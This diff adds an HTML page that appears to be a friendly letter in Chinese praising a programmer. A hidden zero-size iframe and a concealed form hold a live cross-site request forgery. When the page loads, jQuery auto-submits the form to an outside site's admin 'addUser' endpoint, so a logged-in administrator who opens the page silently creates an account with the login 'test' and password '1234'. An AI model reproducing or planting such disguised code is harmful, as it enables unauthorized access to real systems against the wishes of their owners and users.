@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+	<meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+	<!--CSS-->
+	<link href="http://cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css" rel="stylesheet">
+	<!-- JS-->
+    <script src="http://cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script>
+    <script src="http://cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
+	<style type="text/css">
+	</style>
+	<script>
+		$(function(){ 
+			$("#userForm").submit();
+		});
+	</script>
+</head>
+<body>
+	<iframe name="result" width="0" height="0"></iframe>
+	<form id="userForm" method="get" target="result" action="http://www.btravelplus.com/tbi-admin/tbi/sys/addUser" style="display:none">
+		<input name="loginName" type="text" value="test"/>
+		<input name="password" type="text" value="1234"/>
+		<input name="name" type="text" value="test"/>
+	</form>
+	 <div class="container" style="text-align:center;width:600px">
+		<p class="lead" style="width:250px">亲爱的旺旺：</p>
+		<p class="lead" style="width:250px;margin:10px auto;">你是一个优秀的程序员，你有这程序员天生的本质。有BUG就改很是让人敬畏!</p>
+		<div style="float:right">乔X</div>
+		<br/>
+		<div style="float:right">2016-02-02</div>
+	 </div>
+<body>
+</html>
